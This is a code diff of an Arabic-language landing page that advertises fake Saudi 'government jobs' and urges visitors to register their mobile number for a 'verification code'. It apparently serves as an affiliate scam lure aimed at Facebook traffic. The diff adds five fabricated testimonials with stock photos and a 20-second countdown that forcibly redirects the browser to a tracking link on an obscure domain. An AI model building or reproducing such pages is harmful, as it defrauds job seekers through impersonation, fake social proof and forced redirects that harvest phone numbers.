@@ -4,13 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>وظائف حكومية للسعوديين</title>
-  <script>
-    // إعداد باراميترات التتبع من رابط الإعلان
-    const urlParams = new URLSearchParams(window.location.search);
-    const p1 = urlParams.get('p1') || 'fb_landing';
-    const p2 = urlParams.get('p2') || 'ad1';
-    const finalLink = `https://zpqlvrx.bid/cl/2cc728d3cf4d77bd?p1=${p1}&p2=${p2}&source=landing_page&site=fb`; 
-  </script>
   <style>
     body {
       font-family: 'Tahoma', sans-serif;
@@ -18,29 +11,7 @@
       margin: 0;
       padding: 0;
       color: #111827;
-    }
-    .overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.8);
-      z-index: 999;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      text-align: center;
-      padding: 20px;
-    }
-    .overlay button {
-      margin-top: 20px;
-      padding: 12px 24px;
-      background-color: #10b981;
-      border: none;
-      border-radius: 8px;
-      color: white;
-      font-size: 18px;
-      cursor: pointer;
+      transition: all 0.3s ease-in-out;
     }
     .container {
       max-width: 620px;
@@ -50,6 +21,10 @@
       border-radius: 20px;
       box-shadow: 0 8px 30px rgba(0,0,0,0.08);
       margin-top: 40px;
+      transition: transform 0.3s ease;
+    }
+    .container:hover {
+      transform: scale(1.01);
     }
     h1 {
       color: #047857;
@@ -130,54 +105,72 @@
   </style>
 </head>
 <body>
-  <div id="landing-overlay" class="overlay">
-    <div>
-      <h2>📌 برجاء القراءة والتسجيل باستخدام رقم الهاتف لاستلام كود التفعيل</h2>
-      <button onclick="document.getElementById('landing-overlay').style.display='none';">موافق</button>
-    </div>
-  </div>
   <div class="container">
     <h1>📢 وظائف حكومية للسعوديين 2025</h1>
     <p>فرص عمل برواتب تبدأ من <strong>3,500 ريال سعودي</strong> متاحة الآن للرجال فقط.</p>
     <p class="highlight">للتأكيد، يجب التسجيل باستخدام رقم الجوال لاستلام كود التحقق.</p>
     <div class="countdown">عدد المتقدمين اليوم: <span id="timer">00:20</span></div>
-    <a id="ctaButton" class="cta-btn" target="_blank">🔒 اضغط هنا للتسجيل باستخدام رقم الجوال</a>
-    <div class="comments" id="commentsContainer"></div>
-    <div class="disclaimer">* ملاحظة: يجب إكمال خطوة التحقق عبر رقم الهاتف لتأكيد جدّية الطلب. الوظائف مخصصة للرجال فقط ومحدودة وتُقبل حسب أولوية التسجيل.</div>
-  </div>
-  <script>
-    const button = document.getElementById("ctaButton");
-    button.href = finalLink;
 
+    <a id="cta-link" href="https://vxrlqjp.one/cl/421a1826cd625747?p1=&s1=fb&p2=&source=facebook&site={{site_source_name}}" class="cta-btn" target="_blank">
+      🔒 اضغط هنا للتسجيل باستخدام رقم الجوال
+    </a>
+
+    <div class="comments">
+      <div class="comment">
+        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="سامي">
+        <div class="comment-body">
+          <strong>سامي المطيري</strong>
+          قدمت أمس واستلمت الكود خلال دقيقة، طريقة التسجيل بسيطة وواضحة.
+        </div>
+      </div>
+      <div class="comment">
+        <img src="https://randomuser.me/api/portraits/men/22.jpg" alt="بدر">
+        <div class="comment-body">
+          <strong>بدر الحربي</strong>
+          أول مرة أسجل في وظيفة ويتم التواصل معي بعد ساعتين فقط، ممتاز.
+        </div>
+      </div>
+      <div class="comment">
+        <img src="https://randomuser.me/api/portraits/men/19.jpg" alt="أحمد">
+        <div class="comment-body">
+          <strong>أحمد الزهراني</strong>
+          سجلت وتم التواصل معي اليوم، شكراً لكم على الفرصة.
+        </div>
+      </div>
+      <div class="comment">
+        <img src="https://randomuser.me/api/portraits/men/12.jpg" alt="محمد">
+        <div class="comment-body">
+          <strong>محمد القحطاني</strong>
+          العرض ممتاز وأفضل شيء إنه يشمل كل المناطق داخل السعودية.
+        </div>
+      </div>
+      <div class="comment">
+        <img src="https://randomuser.me/api/portraits/men/38.jpg" alt="عبدالله">
+        <div class="comment-body">
+          <strong>عبدالله الشهري</strong>
+          التسجيل ما أخذ مني دقيقة، وتم إرسال كود التفعيل فوراً، أنصح بالتقديم.
+        </div>
+      </div>
+    </div>
+
+    <div class="disclaimer">
+      * ملاحظة: يجب إكمال خطوة التحقق عبر رقم الهاتف لتأكيد جدّية الطلب. الوظائف مخصصة للرجال فقط ومحدودة وتُقبل حسب أولوية التسجيل.
+    </div>
+  </div>
+
+  <script>
     let time = 20;
     const timer = document.getElementById("timer");
+    const ctaLink = document.getElementById("cta-link").href;
+
     const interval = setInterval(() => {
       time--;
       timer.textContent = `00:${time < 10 ? '0' : ''}${time}`;
-      if (time <= 0) clearInterval(interval);
+      if (time <= 0) {
+        clearInterval(interval);
+        window.location.href = ctaLink;
+      }
     }, 1000);
-
-    const commentsData = [
-      { name: "سامي المطيري", text: "قدمت أمس واستلمت الكود خلال دقيقة، طريقة التسجيل بسيطة وواضحة.", img: 32 },
-      { name: "بدر الحربي", text: "أول مرة أسجل في وظيفة ويتم التواصل معي بعد ساعتين فقط، ممتاز.", img: 22 },
-      { name: "أحمد الزهراني", text: "سجلت وتم التواصل معي اليوم، شكراً لكم على الفرصة.", img: 19 },
-      { name: "محمد القحطاني", text: "العرض ممتاز وأفضل شيء إنه يشمل كل المناطق داخل السعودية.", img: 12 },
-      { name: "عبدالله الشهري", text: "التسجيل ما أخذ مني دقيقة، وتم إرسال كود التفعيل فوراً، أنصح بالتقديم.", img: 38 }
-    ];
-
-    const shuffled = commentsData.sort(() => 0.5 - Math.random());
-    const commentsContainer = document.getElementById("commentsContainer");
-    shuffled.forEach(c => {
-      commentsContainer.innerHTML += `
-        <div class="comment">
-          <img src="https://randomuser.me/api/portraits/men/${c.img}.jpg" alt="${c.name}">
-          <div class="comment-body">
-            <strong>${c.name}</strong>
-            ${c.text}
-          </div>
-        </div>
-      `;
-    });
   </script>
 </body>
 </html>
